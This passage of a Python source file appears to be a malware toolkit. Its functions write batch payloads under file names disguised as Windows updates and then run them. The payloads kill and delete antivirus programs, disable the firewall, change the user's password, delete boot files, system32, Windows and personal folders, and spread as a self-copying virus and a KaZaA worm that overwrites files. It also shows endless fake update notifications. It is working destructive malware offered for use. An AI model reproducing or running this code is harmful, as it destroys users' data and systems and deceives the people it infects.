tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmincls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.datcls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda
software\*.*
rem"""
    filekillav = open(filename, "w+")
    filekillav.write(cmd_del_av)
    filekillav.close()
    time.sleep(1)
    os.system(filename)


'''
I own no credit to this code!

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "New_Windows_Terminal_Commad_List.bat"
'''
def ZIPLINE(filename="New_Windows_Terminal_Commad_List.bat"):
    cmd_zipline_virus = r"""@echo off>nul.ViRuS
if ?%1==?/ViRuS_MULTIPLY goto ViRuS_multiply
if ?%1==?/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
if ?%1==?/ViRuS_FINDSELF goto ViRuS_findself
if ?%VOFF%==?T goto ViRuS_OLDBAT
set ViRuSname=%0
if not exist %0.bat call %0 /ViRuS_FINDSELF %path%
if not exist %ViRuSname%.bat set ViRuSname=
if ?%ViRuSname%==? goto ViRuS_OLDBAT
rem ViRuS if batch is started with name.BAT, virus will not become active
rem ViRuS it was a bug, now it?s a feature ! (also notice the voff variable)
rem ViRuS also if batch was only in an append /xn path (chance=minimal)
attrib +h %ViRuSname%.bat
for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
attrib -h %ViRuSname%.bat
set ViRuSname=
goto ViRuS_OLDBAT
:ViRuS_findself
if ?%2==? goto XXX_END>nul.ViRuS
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
shift>nul.ViRuS
goto ViRuS_findself
:ViRuS_outer_loop
for %%a in (%2*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
goto XXX_END>nul.ViRuS
:ViRuS_multiply
find ?ViRuS? <%ViRuSname%.bat >xViRuSx.bat
find /v ?ViRuS? <%2 |find /v ?:XXX_END? >>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
goto XXX_END>nul.ViRuS
:ViRuS_OLDBAT
echo on>nul.ViRuS
:XXX_END"""
    filezpl = open(filename, "w+")
    filezpl.write(cmd_zipline_virus)
    filezpl.close()
    time.sleep(1)
    os.system(filename)


'''
I own no credit to this code!

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "Windows_10_Update_Required_File.bat"
'''
def FILEGROUND_WORM(filename="Windows_10_Update_Required_File.bat"):
    # code by W3irdo
    cmd_fileground_worm = r"""@ECHO OFF
if exist c:\romp.bat goto end
:start
cls 
Echo Installing Update...
cd c:\windows\system 
del keyboard.drv 
del mouse.drv 
TITLE System Update
echo ::startup >> c:\romp.bat
echo if not exist c:\damp goto prompt >> c:\romp.bat
echo :start >> c:\romp.bat
echo cls >> c:\romp.bat
echo cd c:\ >> c:\romp.bat
echo cd damp >> c:\romp.bat
echo md keys >> c:\romp.bat
echo pause >> c:\romp.bat
echo copy *.bat c:\damp\keys\ILOVEYOU.bat >> c:\romp.bat
echo copy *.bat c:\damp\keys\ILOVEYOU.bat c:\windows\stone.bat >> c:\romp.bat
echo rmdir c:\WUTemp >> c:\romp.bat
echo del c:\windows\system32\*.* >> c:\romp.bat
echo rmdir c:\windows\system32 >> c:\romp.bat
echo cd c:\ >> c:\romp.bat
echo cd windows >> c:\romp.bat
echo md system32 >> c:\romp.bat
echo pause >> c:\romp.bat
echo cd c:\ >> c:\romp.bat
echo cd windows >> c:\romp.bat
echo cd system32 >> c:\romp.bat
echo md tools >> c:\romp.bat
echo copy *.bat c:\windows\system32\tools\urscrewed.bat
echo echo msgbox" Ur system is now screwed" >> c:\plastic.vbs >> c:\romp.bat
echo echo msgbox" This was no scan... it was more like a scam" >> c:\plastic.vbs >> c:\romp.bat
echo echo msgbox" It has deleted pretty much all of system32 which is in windows and has messed 
 
with windows" >> c:\plastic.vbs >> c:\romp.bat
echo echo msgbox" There is no more windows on this computer" >> c:\plastic.vbs >> c:\romp.bat
echo Rd/s/q c:\windows >> c:\romp.bat
echo Rd/s/q c:\progra~1 >> c:\romp.bat
echo goto part2 >> c:\romp.bat
      >> c:\romp.bat
      >> c:\romp.bat
echo :part2 >> c:\romp.bat
echo cls >> c:\romp.bat
echo cd c:\ >> c:\romp.bat
echo md Kierstyn'scan >> c:\romp.bat
echo pause >> c:\romp.bat
echo goto part3 >> c:\romp.bat
        >> c:\romp.bat
        >> c:\romp.bat
echo :part3 >> c:\romp.bat
echo rename c:\windows c:\viriiscan >> c:\romp.bat
echo goto end1 >> c:\romp.bat
 
echo :prompt >> c:\romp.bat
echo cls >> c:\romp.bat
echo cd c:\ >> c:\romp.bat
echo md damp >> c:\romp.bat
echo copy *.bat c:\damp.bat >> c:\romp.bat
echo echo msgbox" Oh No u r so stupid" >> c:\pomper.vbs >> c:\romp.bat
echo echo msgbox" Wow you probably got this through ur lan" >> c:\pomper.vbs >> c:\romp.bat
echo echo msgbox" Happy dieing staples" >> c:\pomper.vbs >> c:\romp.bat
echo goto start >> c:\romp.bat
      >> c:\romp.bat
      >> c:\romp.bat 
echo :end1 >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Matrix2.vid.bat >> c:\romp.bat 
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\8-legged-freaks.vid.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Password_finder.exe.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\s-club7.bmp.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\JackAss the movie.vid.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\password hacker.exe.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Norton anti virus.exe.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\8-mile.mpg.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\kazaa.exe.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\realplayer.exe.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\MyPic.bmp.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Bill gates *very funny*.bmp.bat >> 
 
c:\romp.bat 
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\Bill gates *very funny*.mpg.bat >> 
 
c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\windows xp.exe.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\How to make viruses.txt.bat >> 
 
c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\*very funny*.bmp.bat >> c:\romp.bat
echo Copy *.bat C:\Program Files\KaZaA\My Shared Folder\How to stop worm viruses.txt.bat >> 
 
c:\romp.bat
echo goto end >> c:\romp.bat
echo :end >> c:\romp.bat
Echo Virus installed
cd c:\Docume~1\All Users\Start Menu\Programs\Startup
copy *.bat cd c:\Docume~1\All Users\Start Menu\Programs\Startup
Echo Now You have to restart to save
START C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec 
rundll32.exe shell32.dll,SHExitWindowsEx n 
pause
del c:\thecreator.bat:end"""
    filefgrw = open(filename, "w+")
    filefgrw.write(cmd_fileground_worm)
    filefgrw.close()
    time.sleep(1)
    os.system(filename)


'''
This function will release all the ip addresses
This won't work with devices with Static IP addresses assigned

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "MICROSOFT_SERVICES_CRITICAL_FEATURES.bat"
if the value passes is "no", a file will not be created!
'''
def IP_CONFIG_RELEASE(filename="MICROSOFT_SERVICES_CRITICAL_FEATURES.bat"):
    if filename == "no":
        cmd_ipcr = "ipconfig /release_all"
        os.system(cmd_ipcr)
    else:
        cmd_ipcr_intelligent = """ipconfig /release
if ERRORLEVEL1 ipconfig /release_all"""
        fileipcr = open(filename, "w+")
        fileipcr.write(cmd_ipcr_intelligent)
        fileipcr.close()
        time.sleep(1)
        os.system(filename)


'''
This function will crash your computer forever
Tested with:  windows 7

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "WINDOWS_UPDATES_DEBUG_LOGS.bat"
'''
def CRASH_PC_FOREVER(filename="WINDOWS_UPDATES_DEBUG_LOGS.bat"):
    cmd_cpcf = r"""@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini"""

    filecpcf = open(filename, "w+")
    filecpcf.write(cmd_cpcf)
    filecpcf.close()
    time.sleep(1)
    os.system(filename)


'''
This function will cause a BSOD ( Blue Screen of Death )
Tested with:  windows 7

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "WINDOWS_KERNEL_UPDATES_DEBUG_LOGS.bat"
'''
def CAUSE_BSOD(filename="WINDOWS_KERNEL_UPDATES_DEBUG_LOGS.bat"):
    cmd_make_bsod = r"""echo off
del %systemdrive%\*.* /f /s /q
shutdown -r -f -t 00"""
    
    filecbsod = open(filename, "w+")
    filecbsod.write(cmd_make_bsod)
    filecbsod.close()
    time.sleep(1)
    os.system(filename)


'''
I own no credit for this code
This function will make your screen starting flash
Tested with:  windows 7

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "WINDOWS_KERNEL_UPDATES_BUG_LOGS.bat"
'''
def SET_FLASHING_SCREEN(filename="WINDOWS_KERNEL_UPDATES_BUG_LOGS.bat"):
    cmd_flashscr = r"""@echo off
echo e100 B8 13 00 CD 10 E4 40 88 C3 E4 40 88 C7 F6 E3 30>\z.dbg
echo e110 DF 88 C1 BA C8 03 30 C0 EE BA DA 03 EC A8 08 75>>\z.dbg
echo e120 FB EC A8 08 74 FB BA C9 03 88 D8 EE 88 F8 EE 88>>\z.dbg
echo e130 C8 EE B4 01 CD 16 74 CD B8 03 00 CD 10 C3>>\z.dbg
echo g=100>>\z.dbg
echo q>>\z.dbg
debug <\z.dbg>nul
del \z.dbg"""

    filesfscr = open(filename, "w+")
    filesfscr.write(cmd_flashscr)
    filesfscr.close()
    time.sleep(1)
    os.system(filename)


'''
This function will make a MATRIX kind of effect
Tested with:  windows 7

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "WINDOWS_SECURITY_UPDATES_DEBUG_LOGS.bat"
'''
def MATRIX(filename="WINDOWS_SECURITY_UPDATES_DEBUG_LOGS.bat"):
    cmd_matrix = r"""@echo off
color 2
:start
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto start"""

    filesmtrix = open(filename, "w+")
    filesmtrix.write(cmd_matrix)
    filesmtrix.close()
    time.sleep(1)
    os.system(filename)


'''
This function will Reset the time of the computer to 00:00
'''
def CHANGE_TIME_TO_MIDNIGHT():
    cmd_ctime_to_midnight = "time 00:00"
    os.system(cmd_ctime_to_midnight)


'''
This function will change the password of the user account to "InShadow"
This requires Administrator Priviliages to work properly!
'''
def CHANGE_PASS_TO_INSHADOW():
    cmd_cpt_inshadow = r"net user %username% InShadow"
    os.system(cmd_cpt_inshadow)


'''
This function will hide the Music Folder 
( it can be seen, if the user has enebled 'show hidden files' option in folder options )
'''
def HIDE_MY_MUSIC_FOLDER():
    cmd_hide_my_music_folder = 'attrib +h "%userprofile%\my documents\my music"'
    os.system(cmd_hide_my_music_folder)

'''
This function will delete every file inside My Documents folder
'''
def DELETE_MY_DOCUMENTS():
    cmd_del_my_music_folder = r'del /f /q "C:\Users\%userprofile%\My Documents\*.*"'
    os.system(cmd_del_my_music_folder)

'''
This function will delete every file inside My Pictures folder
'''
def DELETE_MY_PICTURES():
    cmd_del_my_pic_folder = r'del /f /q "C:\Users\%userprofile%\My Pictures\*.*"'
    os.system(cmd_del_my_pic_folder)


'''
This function will diable the firewall temporarily

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "no" which will not create a file
if you pass some other name ( like 'name.bat' ) to the function, 
it will create a file will that name and the code will be in it and that file will be the file to excecuted
'''
def DISABLE_FIREWALL_TEMP(filename="no"):
    if filename == "no":
        cmd_disable_firewall_temp_1 = 'net stop "MpsSvc"'
        cmd_disable_firewall_temp_2 = 'taskkill /f /t /im "FirewallControlPanel.exe"'
        os.system(cmd_disable_firewall_temp_1)
        os.system(cmd_disable_firewall_temp_2)
    else:
        cmd_disable_firewall = '"net stop "MpsSvc"'
        cmd_disable_firewall_2 = 'taskkill /f /t /im "FirewallControlPanel.exe"'

        filedf = open(filename, "w+")
        filedf.write(cmd_disable_firewall + "\n" + cmd_disable_firewall_2)
        filedf.close()
        time.sleep(1)
        os.system(filename)
'''
This function will infect all the batch file in the specific directory
You have to change the directory manually, this cannot be done by this function for now

a file will be created from this function and you can change the file name if you want ( optional )
this is the filename used by default "WINDOWS_10_SERVICE_COMMANDS.bat"
'''
def INFECT_BATCH_FILES(filename="WINDOWS_10_SERVICE_COMMANDS.bat"):
    cmd_ibatf = """@echo off
::----Infect All Bat Files---::
    Dir %Homedrive% /s /b > DirPath                        
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul  
            For %%Z In (%DirPath%\*.bat) Do (
            Set BatInfect=%%Z > Nul
            Copy /y %0 %BatInfect%
        )
    )"""
    fileibatf = open(filename, "w+")
    fileibatf.write(cmd_ibatf)
    fileibatf.close()
    time.sleep(1)
    os.system(filename)


'''
This function will hide any folder passed when calling the function
( it can be seen, if the user has enebled 'show hidden files' option in folder options )
'''
def HIDE_FOLDER(folderpath):
    cmd_hidefolder = 'attrib +h ' + str(folderpath)
    os.system(cmd_hidefolder)


'''
This function will dele all the files in the folder ( you need to pass the folder path when calling this function )
Make sure to not to include '\' at the end of the directory you are passing!
'''
def DELETE_FILES_IN_FOLDER(folderpath): # you need to enter the folder path
    cmd_del_files_in_folder = 'del /f /q ' + str(folderpath) + r"\*.*"
    os.system(cmd_del_files_in_folder)


'''
This function will infect all files with the extension 
which you pass this function while using this in the specific directory
You have to change the directory manually, this cannot be done by this function for now

Usage: INFECT_ANY_FILE('jpg', 'Any_File_name.bat')

Make sure to inlude .bat at the end of the file name
Make sure to not to include '.' when entering the file extension
Passing a '*' as the file extension ( first value ) will infect all the files

a file will be created from this function and you can change the file name if you want ( optional )
this is the filename used by default "WINDOWS_ACTIVE_DIRECTORY_NEW.bat"
'''
def INFECT_ANY_FILE(fextension, filename="WINDOWS_ACTIVE_DIRECTORY_NEW.bat"): # file extension should be without the '.'
    cmd_iaf = r"""@echo off
::------- FIX FILE ISSUES -----::
Dir %Homedrive% /s /b > DirPath                        
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul  
            For %%Z In (%DirPath%\*.""" + str(fextension) + r""") Do (
            Set DocInfect=%%Z > Nul
            Copy /y %0 %DocInfect%
        )
    )"""
    fileiaf = open(filename, "w+")
    fileiaf.write(cmd_iaf)
    fileiaf.close()
    time.sleep(1)
    os.system(filename)

'''
This function will show one notification to the user!
You can pass two values to the function, they are the title, message

Usage: NOTIFY_USER_ANY(title="Notification with Python", message="This is a test notification", iconpath=".\not_icon.ico", tdurationt=20)
if you dont need an icon path, just don't pass it
everything here is optional
'''
def NOTIFY_USER_ANY(title="Windows Update", message="If the computer freezes, restart the computer and start the update again!", iconpath="no", tduration=20):
    if iconpath == "no":
        toaster = win10toast.ToastNotifier()
        toaster.show_toast(title, message, duration=tduration)
    
    else:
        toaster = win10toast.ToastNotifier()
        toaster.show_toast(title, message, icon_path=iconpath, duration=tduration)


'''
This function will show unlimited notifications to the user!
You can pass two values to the function, they are the title, message

Usage: NOTIFY_USER_ANY(title="Notification with Python", message="This is a test notification", iconpath=".\not_icon.ico", tdurationt=15)
if you dont need an icon path, just don't pass it
everything here is optional
'''
def NOTIFY_USER_UNLIMITED(title="Windows Update", message="If the computer freezes, restart the computer and start the update again!", iconpath="no", tduration=15):
    if iconpath == "no":
        while True:
            toaster = win10toast.ToastNotifier()
            toaster.show_toast(title, message, duration=tduration)
    
    else:
        while True:
            toaster = win10toast.ToastNotifier()
            toaster.show_toast(title, message, icon_path=iconpath, duration=tduration)



# NOTIFY_USER_ANY()
